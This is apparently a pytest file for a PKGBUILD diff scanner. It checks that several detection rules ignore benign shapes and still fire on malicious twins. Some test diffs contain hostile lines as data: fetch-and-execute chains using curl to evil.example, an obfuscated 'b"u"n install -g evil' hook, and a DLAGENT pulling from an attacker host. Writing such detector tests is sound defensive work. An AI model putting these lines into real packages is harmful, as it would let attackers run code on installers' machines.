"""False positives from the 2026-10-23 watcher triage.

Each case pins the benign shape that fired and the true-positive twin the
fix must keep.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402
from trustsight.differ._sources import extract_urls_from_diff  # noqa: E402


def _ids(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


# --- H077: a dependency name is not a parse-time fetch ---------------------

def test_h077_ignores_a_quoted_dependency_entry():
    # The array opener is a context line; the added entry lost its quotes in
    # the tokenizer, which made `curl` look like a top-level command.
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,4 @@\n"
            " pkgname=p\n"
            " depends=(\n"
            "+    \"curl\"\n"
            " )\n")
    assert "H077" not in _ids(diff)


def test_h077_still_fires_on_a_top_level_fetch():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=p\n"
            "+curl -fsSL https://evil.example/x\n")
    assert "H077" in _ids(diff)


# --- X003: a full long option is not a truncated one -----------------------

def test_x003_accepts_the_full_output_option():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+build() {\n"
            "+  curl \"$url\" --output \"$srcdir/x.zip\"\n"
            "+}\n")
    assert "X003" not in _ids(diff)


def test_x003_still_fires_on_a_truncated_option():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+build() {\n"
            "+  curl --outp \"$srcdir/x.zip\" \"$url\"\n"
            "+}\n")
    assert "X003" in _ids(diff)


# --- H065: ordinary option quoting is not obfuscation ----------------------

def test_h065_ignores_an_option_argument_quote():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+package() {\n"
            "+  install -Dm\"$mode\" a b\n"
            "+}\n")
    assert "H065" not in _ids(diff)


def test_h065_still_fires_when_the_command_word_is_split():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+post_install() {\n"
            "+  b\"u\"n install -g evil\n"
            "+}\n")
    assert "H065" in _ids(diff)


# --- C004: a source and its checksum leaving together ----------------------

def test_c004_ignores_a_removed_local_source_with_its_checksum():
    a, b = "a" * 64, "b" * 64
    post = (f"pkgname=p\nsource=('https://e.example/x.tar.gz')\n"
            f"sha256sums=('{a}')\n")
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,3 +1,3 @@\n"
            " pkgname=p\n"
            f"-source=('https://e.example/x.tar.gz' 'fix.patch')\n"
            f"+source=('https://e.example/x.tar.gz')\n"
            f"-sha256sums=('{a}' '{b}')\n"
            f"+sha256sums=('{a}')\n")
    assert "C004" not in _ids(diff, current_text=post)


def test_c004_still_fires_when_the_source_remains():
    a = "a" * 64
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,2 @@\n"
            " pkgname=p\n"
            f"-sha256sums=('{a}')\n")
    assert "C004" in _ids(
        diff, current_text="pkgname=p\nsource=('https://e.example/x.tar.gz')\n")


# --- url= is the declared upstream, not a fetched source -------------------

def test_url_declaration_is_not_a_source_url():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=p\n"
            "+url=\"https://project.example/\"\n")
    result = extract_urls_from_diff(diff)
    # The generic extractor still reports it (host-change callers need the
    # URL), but it is marked as a declaration so buckets and novelty drop it.
    assert result.added_urls == ["https://project.example/"]
    assert result.declared_urls == ["https://project.example/"]
    assert "SOURCE_BUCKET" not in _ids(diff)


def test_source_url_is_still_extracted():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=p\n"
            "+source=(\"https://project.example/x.tar.gz\")\n")
    assert extract_urls_from_diff(diff).added_urls == [
        "https://project.example/x.tar.gz"
    ]


# --- A declared manual DLAGENT is not an exotic fetch ----------------------

def test_hib_source_with_a_manual_dlagent_is_not_an_exotic_fetch():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
            " pkgname=p\n"
            "+source=('hib://VendorTool.zip')\n"
            "+DLAGENTS+=('hib::/usr/bin/echo \"download it manually\"; exit 1')\n")
    ids = _ids(diff)
    assert "H034" not in ids
    assert "H096" not in ids


def test_hib_source_without_a_dlagent_still_fires():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=p\n"
            "+source=('hib://VendorTool.zip')\n")
    assert "H034" in _ids(diff)


def test_dlagent_with_a_network_client_still_fires():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,4 @@\n"
            " pkgname=p\n"
            "+source=('hib://VendorTool.zip')\n"
            "+DLAGENTS+=('hib::/usr/bin/curl https://evil.example/%u')\n")
    assert "H096" in _ids(diff)


# --- X014: a grep pattern is data, not an assignment -----------------------

def test_x014_ignores_an_env_pattern_passed_to_grep():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+build() {\n"
            "+  grep -qE 'ENV=' \"$srcdir/config\"\n"
            "+}\n")
    assert "X014" not in _ids(diff)


def test_x014_still_fires_on_an_executed_env_assignment():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+build() {\n"
            "+  ENV=/tmp/evil.sh sh -c true\n"
            "+}\n")
    assert "X014" in _ids(diff)


# --- H082: a package manager fetch and a host tuple are not a payload ------

def test_h082_ignores_cargo_fetch_and_a_host_tuple():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,7 @@\n"
            " pkgname=p\n"
            "+prepare() {\n"
            "+  cargo fetch --locked --target host-tuple\n"
            "+}\n"
            "+build() {\n"
            "+  ./tools/generate_man_pages.sh \"target/$(rustc --print host-tuple)/\"\n"
            "+}\n")
    assert "H082" not in _ids(diff)


def test_h082_still_fires_on_a_fetch_then_execute_chain():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,6 @@\n"
            " pkgname=p\n"
            "+build() {\n"
            "+  curl -o stage.sh https://evil.example/stage.sh\n"
            "+  ./stage.sh\n"
            "+}\n")
    assert "H082" in _ids(diff)


# --- R054: a $pkgdir -t destination is inside the package root -------------

def test_r054_ignores_an_install_t_pkgdir_unit():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+package() {\n"
            "+  install -Dm644 -t \"$pkgdir\"/usr/lib/systemd/system/ z.service\n"
            "+}\n")
    assert "R054" not in _ids(diff)


def test_r054_still_fires_on_the_live_unit_path():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,5 @@\n"
            " pkgname=p\n"
            "+package() {\n"
            "+  install -Dm644 -t /usr/lib/systemd/system/ z.service\n"
            "+}\n")
    assert "R054" in _ids(diff)


# --- R152: a declared upstream URL is not a source -------------------------

def test_r152_ignores_the_declared_upstream_url():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=p\n"
            "+url=\"https://project.github.io/\"\n")
    assert "R152" not in _ids(diff)


def test_r152_still_fires_on_a_source_url():
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,3 @@\n"
            " pkgname=p\n"
            "+source=(\"https://project.github.io/x.tar.gz\")\n")
    assert "R152" in _ids(diff)


# --- C001: a system electron launcher is not a new capability --------------

def test_c001_ignores_a_system_electron_launcher_on_a_bump():
    a, b = "a" * 64, "b" * 64
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,8 @@\n"
            " pkgname=p\n"
            " source=('https://e.example/x.tar.gz')\n"
            "-pkgver=1.0\n+pkgver=1.1\n"
            f"-sha256sums=('{a}')\n+sha256sums=('{b}')\n"
            "+build() {\n"
            "+  /usr/lib/electron44/electron -e 'console.log(1)'\n"
            "+}\n")
    assert "C001" not in _ids(diff)


def test_c001_still_fires_when_the_bump_adds_a_script_execution():
    a, b = "a" * 64, "b" * 64
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,4 +1,8 @@\n"
            " pkgname=p\n"
            " source=('https://e.example/x.tar.gz')\n"
            "-pkgver=1.0\n+pkgver=1.1\n"
            f"-sha256sums=('{a}')\n+sha256sums=('{b}')\n"
            "+build() {\n"
            "+  ./tools/stage.sh\n"
            "+}\n")
    assert "C001" in _ids(diff)


# --- Bucket allowlist: vendor CDNs are official project hosts --------------

def test_microsoft_download_cdn_is_an_official_bucket():
    from trustsight.buckets import classify_url

    with shipped_config():
        bucket, _domain = classify_url(
            "https://vscode.download.prss.microsoft.com/dbazure/x.deb")
    assert bucket == "official"


def test_gentoo_developer_patchset_host_is_an_official_bucket():
    from trustsight.buckets import classify_url

    with shipped_config():
        bucket, _domain = classify_url(
            "https://dev.gentoo.org/~user/mozilla/patch.tar.xz")
    assert bucket == "official"
